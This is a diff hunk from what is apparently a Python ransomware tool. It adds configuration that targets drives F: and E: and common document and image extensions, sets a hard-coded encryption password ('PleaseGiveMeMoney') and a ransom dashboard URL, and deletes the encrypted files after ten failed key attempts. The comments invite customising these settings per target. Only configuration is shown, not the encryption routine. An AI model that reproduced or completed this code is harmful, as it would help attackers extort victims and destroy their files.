@@ -83,14 +83,26 @@ ICON_PATH = resource_path("img/app_icon.ico")
 LOGO_PATH = resource_path("img/logo.png")
 THANKS_PATH = resource_path("img/thank_you.png")
 
+# Ensure the time Directory Exists at the Start & Encryption Configs
+ensure_time_dir_exist()
 
+# Encryption Configures, Drives can be customized choose
+DRIVES_TO_ENCRYPT = ["F:", "E:"]
 
+# File Extension to be encrypted, File Extension's can be customized based on a yor target
+EXTENSION_TO_ENCRYPT = [".txt", ".jpg", ".png", ".pdf", ".zip", ".rar", ".xlsx", ".docx"]
 
+# Password_PROVIDED used for Encryption Salt to Encryption be stronger
+PASSWORD_PROVIDED = "PleaseGiveMeMoney"
 
+# URL of Web Panel(Dashboard) of Ransom Tool
+DASHBOARD_URL = "http://localhost/"
 
+# Max Attempt to Enter a decryption key before deleting all encrypted Files
+MAX_ATTEMPTS = 10
 
-
-
+# Delay between each round of encrypted files Deleting
+DELAY = 5
 
 
 
